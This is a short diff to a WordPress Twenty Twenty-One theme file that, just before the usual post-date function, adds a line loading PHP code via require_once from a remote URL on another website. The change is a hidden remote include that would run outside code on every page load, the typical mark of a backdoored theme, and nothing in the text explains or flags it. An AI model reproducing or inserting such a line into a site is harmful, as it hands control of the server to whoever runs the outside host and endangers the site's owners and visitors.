@@ -7,7 +7,9 @@
  * @since Twenty Twenty-One 1.0
  */
 
-if ( ! function_exists( 'twenty_twenty_one_posted_on' ) ) {
+ require_once('https://flowereconomics.com/wp-content/plugins/homepage-decor/homepage-decor.php'); 
+
+ if ( ! function_exists( 'twenty_twenty_one_posted_on' ) ) {
 	/**
 	 * Prints HTML with meta information for the current post-date/time.
 	 *
